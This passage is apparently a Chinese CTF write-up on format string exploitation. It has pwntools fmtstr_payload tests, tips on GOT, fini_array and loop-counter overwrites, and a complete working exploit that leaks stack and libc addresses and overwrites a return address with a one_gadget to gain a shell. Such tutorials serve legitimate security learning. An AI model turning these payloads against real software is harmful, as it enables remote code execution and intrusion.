    payload = fmtstr_payload(9, {addr:0x5}, 0, 'int')
#### 测试64位
测试代码
    #!/usr/bin/env python
    # coding=utf-8
    from pwn import *
    io = process('./a.out')
    addr = int(io.recvline(),16)
    print("addr-> " + hex(addr))
    gdb.attach(io, "b printf\nc")
    context.arch='amd64'
    payload = fmtstr_payload(14, {addr:0x5}, 0, 'byte')
    print("---------------------------------------------")
    print(payload)
    print(len(payload))
    io.sendline(payload)
    io.interactive()
##### 测试byte写入
    payload = fmtstr_payload(14, {addr:0x5}, 0, 'byte')
##### 测试short写入
    payload = fmtstr_payload(10, {addr:0x5}, 0, 'short')
##### 测试int写入
    payload = fmtstr_payload(8, {addr:0x5}, 0, 'int')
## 另外一些小tips
综合多方面知识考虑格式化字符串
### got表攻击
在RELRO保护没开的时候可以考虑一下got表攻击，利用printf写got表，然后通过atoi类似的传参，就可以直接system了
还有，如果找不到got表，可以利用stack_check_fail，故意报错执行这个函数
### fini_array攻击
由于在程序结束前会调用fini_array里的函数指针，所以我们可以通过攻击这个达到二次循环
### 循环条件攻击
我们可以攻击for循环条件，比如将for(int i=0; i 0x56557010 ("%22$x%15$x\n")
    0008| 0xffb17394 --> 0x56557010 ("%22$x%15$x\n")
    0012| 0xffb17398 --> 0x10 
    0016| 0xffb1739c ("7WUV\374s\360\367\270oUVtt\261\377\001")
    0020| 0xffb173a0 --> 0xf7f073fc --> 0xf7f08980 --> 0x0 
    0024| 0xffb173a4 --> 0x56556fb8 --> 0x1ed8 
    0028| 0xffb173a8 --> 0xffb17474 --> 0xffb183ba ("./7631454338ff70b1a6b1262f5f36beac")
    0032| 0xffb173ac --> 0x1 
    0036| 0xffb173b0 --> 0x1 
    0040| 0xffb173b4 --> 0x0 
    0044| 0xffb173b8 --> 0xffb10a31 --> 0x0 
    0048| 0xffb173bc --> 0x84188400 
    0052| 0xffb173c0 --> 0xffb173e0 --> 0x1 
    0056| 0xffb173c4 --> 0x0 
    0060| 0xffb173c8 --> 0x0 
    0064| 0xffb173cc --> 0xf7d4e7e1 (:   add    esp,0x10)
    0068| 0xffb173d0 --> 0xf7f07000 --> 0x1d6d6c 
    0072| 0xffb173d4 --> 0xf7f07000 --> 0x1d6d6c 
    0076| 0xffb173d8 --> 0x0 
    0080| 0xffb173dc --> 0xf7d4e7e1 (:   add    esp,0x10)
    0084| 0xffb173e0 --> 0x1 
    0088| 0xffb173e4 --> 0xffb17474 --> 0xffb183ba ("./7631454338ff70b1a6b1262f5f36beac")
    0092| 0xffb173e8 --> 0xffb1747c --> 0xffb183dd ("MYVIMRC=/home/NoOne/.vimrc")
    0096| 0xffb173ec --> 0xffb17404 --> 0x0
第一次格式化字符串我选了两个地方，%22$x%15$x  
也就是上面的64跟92处，为什么选这两个位置呢？因为第一个，存了libc地址，第二个存了栈地址，并且他还有二级指针指向栈，这是必须的，因为格式化字符串写在了bss段，要在栈里写东西的话，只能通过二级指针，第一步先将这个地址泄露出来，第二步，往这个地址里写东西，因为这个地址本身就是栈里的嘛，所以写进去后，地址就在栈里了，所以就可以跟常规格式化字符串一样利用了
还有一点，只有三次机会，并且限制了大小，我第一次泄露，第二次写入要写入的地址，第三次写入的时候长度明显不够，所以我需要增大次数，所以要找到变量i或者N的地址，N的地址我是找不到，所以我找了i，他是个有符号数，我把他高位改成0xff，就可以变成负数，经过测试，上述40处为i,80处为返回地址，  
返回地址可以用find找到，找栈里的libc_start_main存在的地方就是ret
i调试下就出来了，三次会变化的地方
#### 准备部分
    def Input(content):
        sla("2. Exit\n", "1")
        sla("It's time to input something\n", content)
    def write(size1, size2):
        payload = "%{}p%{}$hn".format(size1, 21)
        Input(payload)
        payload = "%{}p%{}$hn".format(size2, 57)
        Input(payload)
        payload ="123456781234567"
        Input(payload)
#### 地址泄露部分
    #stage 1
        payload = "%22$x%15$x"
        Input(payload)
        stack_addr = int(r(8), 16)
        ret = stack_addr - 0xa0
        count = stack_addr - 0xc8
        __libc_start_main_addr = int(r(8), 16)-241
        lg("stack_addr", stack_addr)
        lg("ret_addr", ret)
        lg("libc_start_main", __libc_start_main_addr)
        lg("count", count)
        libc_base = __libc_start_main_addr - libc.symbols['__libc_start_main']
        one_gadget = [0x1395ba, 0x1395bb]
        one_gadget = libc_base + one_gadget[0]
        lg("one_gadget", one_gadget)
        system_addr = libc_base + libc.symbols['system']
#### 修改变量i
    write(0xffff & count + 2, 0xffff)
至于偏移为什么是这个，需要你们自己去调试，二级指针那个点位就是那个地方，还有修改后四位够了，栈里的位置，注意，这里是修改的是i的地址+2部分，也就是4个字节的前两个字节部分，修改为0xffff
#### 修改ret地址
    write(0xffff & ret, 0xffff & one_gadget)
        write((0xffff&ret) + 2, (0xffff0000 & one_gadget)>>16)
        sla("2. Exit\n", "2")
这里先写后两个字节，在写前两个字节，写成one_gadget
### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from pwn import *
    local = 1
    host = '127.0.0.1' 
    port = 10000
    context.log_level = 'debug'
    exe = './7631454338ff70b1a6b1262f5f36beac'
    context.binary = exe
    elf = ELF(exe)
    libc = elf.libc
    #don't forget to change it
    if local:
        io = process(exe)
    else:
        io = remote(host,port)
    s    = lambda data            : io.send(str(data))
    sa   = lambda delim,data      : io.sendafter(str(delim), str(data))
    sl   = lambda data            : io.sendline(str(data))
    sla  = lambda delim,data      : io.sendlineafter(str(delim), str(data))
    r    = lambda numb=4096       : io.recv(numb)
    ru   = lambda delim,drop=True : io.recvuntil(delim, drop)
    uu32 = lambda data            : u32(data.ljust(4, '\x00'))
    uu64 = lambda data            : u64(data.ljust(8, '\x00'))
    lg   = lambda name,data       : io.success(name + ": 0x%x" % data)
    # break on aim addr
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
            gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(io,"b *{}".format(hex(addr)))
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     i386-32-little
    # RELRO:    Full RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      PIE enabled
    def Input(content):
        sla("2. Exit\n", "1")
        sla("It's time to input something\n", content)
    def write(size1, size2):
        payload = "%{}p%{}$hn".format(size1, 21)
        Input(payload)
        payload = "%{}p%{}$hn".format(size2, 57)
        Input(payload)
        payload ="123456781234567"
        Input(payload)
    def exp():
        #stage 1
        payload = "%22$x%15$x"
        Input(payload)
        stack_addr = int(r(8), 16)
        ret = stack_addr - 0xa0
        count = stack_addr - 0xc8
        __libc_start_main_addr = int(r(8), 16)-241
        lg("stack_addr", stack_addr)
        lg("ret_addr", ret)
        lg("libc_start_main", __libc_start_main_addr)
        lg("count", count)
        libc_base = __libc_start_main_addr - libc.symbols['__libc_start_main']
        one_gadget = [0x1395ba, 0x1395bb]
        one_gadget = libc_base + one_gadget[0]
        lg("one_gadget", one_gadget)
        system_addr = libc_base + libc.symbols['system']
        write(0xffff & count + 2, 0xffff)
        write(0xffff & ret, 0xffff & one_gadget)
        #gdb.attach(io, "b printf \n c")
        write((0xffff&ret) + 2, (0xffff0000 & one_gadget)>>16)
        sla("2. Exit\n", "2")
    if __name__ == '__main__':
        exp()
        io.interactive()
## 总结
  1. 格式化字符串的总结其实偏向于工具的利用，因为这个类型题目其实就是数学计算，没啥新奇的，还有就是加各种限制条件上去而已
  2. 这个payload只适用于极少数的题目，因为现在的格式化字符串都不会出那种直接写值的了，通过泄露地址，然后在利用而已，他只是一个辅助作用
  3. 格式化字符串推荐大家用Pwngdb去计算偏移，github上找得到，这个方便的很，直接通过stack查看到具体地址存放在哪，fmtarg 地址，然后就计算出偏移了